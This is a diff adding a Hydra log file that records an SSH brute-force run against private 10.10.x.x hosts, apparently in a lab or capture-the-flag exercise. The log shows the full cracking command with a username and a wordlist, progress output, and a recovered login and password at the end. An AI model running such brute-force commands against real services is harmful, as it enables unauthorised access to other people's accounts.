@@ -1,0 +1,18 @@
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-16 22:00:06
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 140608 login tries (l:1/p:140608), ~2197 tries per task
+[DATA] attacking ssh://10.10.7.100:22/
+[STATUS] 523.00 tries/min, 523 tries in 00:01h, 140146 to do in 04:28h, 64 active
+[STATUS] 448.33 tries/min, 1345 tries in 00:03h, 139335 to do in 05:11h, 64 active
+[STATUS] 410.86 tries/min, 2876 tries in 00:07h, 137804 to do in 05:36h, 64 active
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+# Hydra v8.8 run at 2019-11-17 16:20:12 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:20:21 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:21:05 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:29:09 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:41:17 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:42:09 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:42:44 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt ssh://10.10.165.13)
+# Hydra v8.8 run at 2019-11-17 16:45:53 on 10.10.165.13 ssh (hydra -t 64 -l cbbcadmin -P pass.lst -o hydra_result.txt -f ssh://10.10.165.13)
+[22][ssh] host: 10.10.165.13   login: cbbcadmin   password: nY4s33Gsn
